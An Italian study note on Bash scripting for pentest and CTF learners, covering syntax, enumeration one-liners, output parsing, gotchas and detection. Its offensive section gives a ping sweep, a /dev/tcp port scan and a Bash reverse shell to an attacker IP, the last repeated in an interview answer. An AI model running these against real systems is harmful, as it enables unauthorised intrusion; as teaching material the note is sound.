---
tipo: concetto
tag: [linux]
fase: 1
fonti: 6
aggiornato: 2026-06-26
stato: maturo
aliases: ["Bash Scripting", "Scripting Bash", "Shell e Bash"]
---

# Bash Scripting

## In breve

**Bash scripting** è la pratica di scrivere script di testo — file `.sh` — che la shell Bash esegue riga per riga come se li digitassi tu al terminale. Permette di automatizzare qualunque sequenza di comandi Linux.

## Come funziona

Uno script Bash è un file di testo che inizia con lo **shebang**:

```bash
#!/bin/bash
```

Questa prima riga dice al sistema operativo quale interprete usare. Lo script viene poi reso eseguibile e lanciato:

```bash
chmod +x mio_script.sh
./mio_script.sh
```

### Strutture fondamentali

```bash
# Variabile
NOME="Alice"
echo "Ciao, $NOME"

# Condizione
if [ -f /etc/passwd ]; then
    echo "File esiste"
fi

# Ciclo
for UTENTE in alice bob; do
    echo "Utente: $UTENTE"
done

# Lettura dell'output di un comando
UTENTE_CORRENTE=$(whoami)
```

## Esempio pratico

Script che trova tutti i file SUID nel sistema (tecnica usata nel [[Privilege Escalation Linux]]):

```bash
#!/bin/bash
echo "=== File con SUID ==="
find / -perm -4000 -type f 2>/dev/null
```

Eseguilo con:

```bash
chmod +x cerca_suid.sh
./cerca_suid.sh
```

## Rilevanza per la sicurezza

Gli script Bash sono strumenti centrali nel pentesting e nel CTF:
- Automatizzano la fase di [[Enumerazione]] (raccolta di informazioni su utenti, processi, permessi).
- I file `.sh` con permessi errati o con [[SUID e SGID]] attivi possono diventare vettori di privilege escalation.
- Comprendere gli script permette di analizzare malware o backdoor scritti in Bash.
- La gestione di [[Variabili d'Ambiente]] all'interno degli script è spesso fonte di vulnerabilità.

---

# Strato esperto operativo (scripting offensivo)

## Meccanismo interno: come Bash esegue

Quando lanci `./script.sh`, il kernel legge lo **shebang** (`#!/bin/bash`) e invoca quell'interprete passando il file come argomento (`/bin/bash script.sh`). Senza permesso di esecuzione puoi comunque eseguirlo con `bash script.sh` (l'interprete legge il file, il bit `x` non serve). Differenza chiave: `./s.sh` (subshell, eredita ambiente) vs `source s.sh`/`. s.sh` (esegue **nella shell corrente**: modifica le variabili del padre). Conta per il pentest quando vuoi che un export di PATH persista.

## Costrutti utili in enumerazione/pentest

```bash
set -euo pipefail              # uno script che fallisce presto (debug enum)
IFS=$'\n'                      # split sicuro su righe (path con spazi)

# Sostituzione comando, qui-document, array
hosts=( $(seq 1 254) )
read -r -d '' BANNER <<'EOF'
...payload multilinea...
EOF

# Parametri / default
TARGET="${1:?Usage: $0 <cidr>}"
PORT="${2:-80}"               # default 80

# Aritmetica e test
(( PORT > 1024 )) && echo "high port"
[[ -w /etc/passwd ]] && echo "passwd scrivibile!"
```

## One-liner utili al pentest

**Host discovery (ping sweep, no nmap):**
```bash
for i in $(seq 1 254); do (ping -c1 -W1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP" &); done; wait
```
**Port scan TCP puro Bash (`/dev/tcp`, utile su box senza nmap/nc):**
```bash
for p in $(seq 1 1000); do (echo >/dev/tcp/10.10.10.5/$p) 2>/dev/null && echo "porta $p aperta"; done
```
**Reverse shell senza nc (solo Bash):**
```bash
bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
```
**Banner grab:**
```bash
exec 3<>/dev/tcp/target/80; echo -e "HEAD / HTTP/1.0\r\n\r\n" >&3; cat <&3
```
**Enum SUID + capabilities + sudo in un colpo:**
```bash
echo "[SUID]"; find / -perm -4000 -type f 2>/dev/null
echo "[CAPS]"; getcap -r / 2>/dev/null
echo "[SUDO]"; sudo -l 2>/dev/null
echo "[WRITABLE]"; find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys' | head
```

## Parsing dell'output (cut / awk / sort / grep)

```bash
# Estrai utenti con shell di login da /etc/passwd
grep -E '/bin/(ba)?sh$' /etc/passwd | cut -d: -f1

# Da output nmap -oG: solo IP con la 22 aperta
grep '22/open' scan.gnmap | awk '{print $2}'

# Conta e ordina le porte più comuni in un file di scansione
awk -F/ '/open/{print $1}' ports.txt | sort | uniq -c | sort -rn

# Loop su una lista di host da file, una azione per host
while read -r host; do echo "[*] $host"; curl -s -o /dev/null -w "%{http_code}\n" "http://$host"; done < hosts.txt
```

> [!tip] `mapfile` per liste pulite
> `mapfile -t IPS < hosts.txt` carica le righe in un array senza problemi di word-splitting; poi `for ip in "${IPS[@]}"; do ...; done`.

## Riferimento: test, parametri posizionali, funzioni

### Test condizionali

`if` valuta l'**exit status** di un comando (0 = vero), non un'espressione booleana. I test si scrivono con `[ ]` (POSIX), `[[ ]]` (esteso bash, consigliato) o `(( ))` (aritmetico):

| Test | Significato |
|------|-------------|
| `[[ "$a" == "$b" ]]` | uguaglianza stringhe (`!=`, `=~` per regex) |
| `[[ -z "$s" ]]` / `[[ -n "$s" ]]` | stringa vuota / non vuota |
| `[[ -f file ]]` / `[[ -d dir ]]` | esiste ed è file / directory |
| `[[ -e path ]]` / `[[ -r/-w/-x path ]]` | esiste / leggibile/scrivibile/eseguibile |
| `(( n > 5 ))` | confronto numerico (anche `-gt -lt -eq -ne` dentro `[ ]`) |

### Parametri posizionali e funzioni

```bash
saluta() {
    local nome="$1"        # $1 = primo argomento; 'local' lo confina alla funzione
    echo "Ciao $nome"
    return 0               # exit status della funzione
}
saluta "mondo"
```

| Variabile | Significato |
|-----------|-------------|
| `$1`..`$9`, `${10}`+ | argomenti posizionali |
| `$#` | numero di argomenti |
| `"$@"` | **tutti** gli argomenti, quotati singolarmente (usa sempre questa forma) |
| `$0` | nome dello script |
| `shift` | scala i parametri (consuma `$1`) |
| `getopts` | parsing delle opzioni `-x` |

### File temporanei sicuri

```bash
tmp="$(mktemp)"                    # path imprevedibile, niente race/symlink attack
trap 'rm -f "$tmp"' EXIT          # pulizia garantita all'uscita dello script
```

Non costruire path prevedibili tipo `/tmp/miofile.$$`: sono vulnerabili a race condition e symlink attack.

> [!tip] Lint e debug
> Valida ogni script con **`shellcheck`** (linter statico: individua quoting mancante, uso errato di `[ ]`, variabili inutilizzate). Controlla la sintassi senza eseguire con `bash -n script.sh` e traccia l'esecuzione riga per riga con `set -x` (o `bash -x script.sh`). Per logica complessa o strutture dati ricche valuta Python: bash eccelle come *collante* tra comandi, non come linguaggio general-purpose.

---

## Casi limite e gotcha
- **Word splitting**: variabili non quotate (`$VAR`) si spezzano su spazi/tab. Quota **sempre**: `"$VAR"`, `"${ARR[@]}"`.
- **`[ ]` vs `[[ ]]`**: usa `[[ ]]` (built-in Bash) — niente sorprese con stringhe vuote e supporta `=~` (regex).
- **`$(...)` rimuove i trailing newline**: per output binario usa file temporanei.
- **`/bin/sh != /bin/bash`**: su molti sistemi `sh` è `dash`; `/dev/tcp`, array e `[[ ]]` **non** esistono in dash. Forza `#!/bin/bash`.
- **CRLF**: uno script editato su Windows (`\r\n`) dà `bad interpreter: /bin/bash^M`. Fix: `sed -i 's/\r$//' s.sh` o `dos2unix`.

## Detection engineering
- Script offensivi compaiono in **`~/.bash_history`** (a meno di `unset HISTFILE`/`HISTSIZE=0`), in `ps`/pspy e nei log del processo. `/dev/tcp` reverse shell → connessioni in uscita anomale (Zeek/netflow).
- MITRE **T1059.004** (Command and Scripting Interpreter: Unix Shell). Detection: `execve` di `bash -i`, `bash` con redirect verso `/dev/tcp`, `curl|bash` pattern. Auditd su `execve` + EDR su processi figli di servizi web.
- Difesa: shell history centralizzata e immutabile; AppArmor che blocca `/dev/tcp` per processi web; monitorare `python -c`/`bash -i`.

## Troubleshooting (5 errori comuni)
1. **`bad interpreter: /bin/bash^M`** → fine riga CRLF: `dos2unix s.sh`.
2. **`[: too many arguments`** → variabile non quotata e vuota in `[ $X = y ]`: usa `[[ $X == y ]]` o quota.
3. **`/dev/tcp: No such file`** → stai girando sotto `dash`/`sh`, non bash. Usa `#!/bin/bash` o `bash s.sh`.
4. **Loop ping lentissimo** → manca il `&` per il parallelismo o il `wait`; aggiungi `-W1` per il timeout.
5. **`Permission denied` lanciando `./s.sh`** → manca `chmod +x`, oppure il mount è `noexec`: aggira con `bash s.sh`.

## Domande da colloquio
> **D: Come apriresti una reverse shell se sul target manca netcat?**
> Bash con `/dev/tcp`: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`. È un file descriptor virtuale di Bash, non un file reale; non funziona sotto `dash`.

> **D: Differenza tra `./script.sh` e `source script.sh`?**
> `./script.sh` esegue in una **subshell** (le variabili/`cd`/`export` non influenzano la shell padre). `source` (o `.`) esegue **nella shell corrente**, quindi può modificarne ambiente e directory.

> **D: Perché quotare le variabili è una questione di sicurezza, non solo di stile?**
> Senza quote, Bash fa word-splitting e glob-expansion sul contenuto: input controllato dall'attaccante (nomi file, argomenti) può iniettare opzioni o comandi. È la stessa classe di bug della wildcard injection nei cron.

## Collegamenti

- [[Pipe e Redirezione]]
- [[Variabili d'Ambiente]]
- [[Permessi Linux]]
- [[Privilege Escalation Linux]]
- [[find]]
- [[grep]]
- [[Reverse Shell e Bind Shell]]
- [[Enumerazione]]

## Fonti

- GNU Bash Reference Manual: https://www.gnu.org/software/bash/manual/bash.html
- The Linux Command Line (W. Shotts) – capitolo scripting: https://linuxcommand.org/tlcl.php
- OverTheWire Bandit (pratica interattiva): https://overthewire.org/wargames/bandit/
- PayloadsAllTheThings — Reverse Shell Cheat Sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- MITRE ATT&CK – Unix Shell (T1059.004): https://attack.mitre.org/techniques/T1059/004/
- TLCL — cap. 27 "Flow Control: if", cap. 32 "Positional Parameters" (test, funzioni, getopts); Google Shell Style Guide & ShellCheck (mktemp/trap, lint — ricerca 2025)
